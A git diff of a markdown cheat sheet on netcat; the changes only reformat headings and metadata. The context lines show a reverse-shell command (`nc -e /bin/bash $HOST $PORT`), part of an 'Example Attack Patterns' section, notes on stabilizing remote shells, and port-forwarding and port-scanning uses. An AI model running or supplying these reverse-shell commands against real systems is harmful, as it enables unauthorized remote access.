@@ -1,13 +1,13 @@
 # Using "netcat"
 
-author:: Nathan Acks
-date:: 2022-06-29
+**author**:: Nathan Acks
+**date**:: 2022-06-29
 
 The netcat binary is *usually* `nc`, but some systems have it at `ncat` or `netcat` instead.
 
 Note that the `-c` and `-e` flags are considered security risks (for obvious reasons!), and are disabled on some systems.
 
-# Start a Client
+## Start a Client
 
 ```bash
 nc $HOST $PORT
@@ -19,7 +19,7 @@ Some versions of netcat support a -e flag that hooks STDIN and STDOUT of an exec
 nc -e /bin/bash $HOST $PORT
 ```
 
-# Start a Server
+## Start a Server
 
 ```bash
 nc -l -p $PORT $HOST
@@ -36,7 +36,7 @@ A netcat server doesn't have to be used just for reverse shells. For example, yo
 * [XSS (Cross-Site Scripting) Attacks](xss-attacks.md)
 * [SQL Injection](sql-injection.md)
 
-# Useful Flags
+## Useful Flags
 
 * `-l` - listen for incoming connections (rather than make an outgoing connection)
 * `-v` - verbose
@@ -45,7 +45,7 @@ A netcat server doesn't have to be used just for reverse shells. For example, yo
 * `-u` - connect using UDP instead of TCP
 * `-k` - keep listening even after client disconnects
 
-# Example Attack Patterns
+## Example Attack Patterns
 
 Example reverse shell:
 
@@ -72,7 +72,7 @@ rm /tmp/p
 
 Initial netcat reverse shells (in particular web shells) are non-interactive.
 
-## Shell "Stabilization"
+### Shell "Stabilization"
 
 Shell "stabilization" refers to the process of making a remote shell behave like a normal local shell - so, allowing interactive programs to work properly, ensuring that input is not echoed inappropriately, etc. In practice, this generally involves creating a *second* connection from within the "unstable" shell, and then using that (keeping the first connection around just so you can restart the "stabilized" shell if you accidentally exit/kill it).
 
@@ -96,19 +96,19 @@ NOTE that in *none* of these cases will the reverse shell pick up on your termin
 
 * [Using "socat"](socat.md)
 
-# Port Forwarding
+## Port Forwarding
 
 ```bash
 nc -lvnp $INCOMING_PORT -c "nc $TARGET_IP $TARGET_PORT"
 ```
 
-# Other Uses
+## Other Uses
 
-## Telnet Replacement
+### Telnet Replacement
 
 If you just have netcat connect to a service directly, it functions exactly like telnet.
 
-## Port Scanning
+### Port Scanning
 
 With the `-z` option, netcat will attempt to connect to all TCP ports on the targets in a sequential fashion (if no ports are specified; otherwise just to the specified port), reporting which are open. It's like a simple, very slow version of Nmap!
 
@@ -118,7 +118,7 @@ Use `-u` to try connecting over UDP rather than TCP.
 
 * [Using "nmap"](nmap.md)
 
-## Port Forwarding
+### Port Forwarding
 
 ```bash
 nc -lvkp $LOCAL_PORT -c "nc $REMOTE_IP $REMOTE_PORT"
